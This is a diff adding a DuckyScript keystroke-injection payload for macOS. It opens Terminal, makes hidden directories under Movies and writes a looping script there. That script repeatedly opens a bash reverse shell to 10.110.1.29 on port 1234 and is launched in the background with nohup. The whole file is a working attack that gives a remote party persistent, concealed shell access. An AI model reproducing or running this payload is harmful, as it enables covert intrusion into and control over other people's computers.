@@ -1,0 +1,41 @@
+GUI SPACE
+STRING TERMINAL
+DELAY 500
+ENTER
+STRING cd Movies
+ENTER
+DELAY 100
+STRING mkdir .harrypotter
+ENTER
+DELAY 100
+STRING cd .harrypotter
+ENTER
+STRING mkdir .sorry
+ENTER
+STRING cd .sorry
+ENTER
+STRING nano i.sh
+
+
+
+
+
+
+
+
+
+STRING nano i.sh
+ENTER
+STRING "#!/bin/bash
+
+while true
+do
+    bash -i >& /dev/tcp/10.110.1.29/1234 0>&1
+    sleep 50
+done &"
+CTRL X
+SHIFT Y
+ENTER
+STRING nohup bash i.sh
+ENTER
+CTRL m
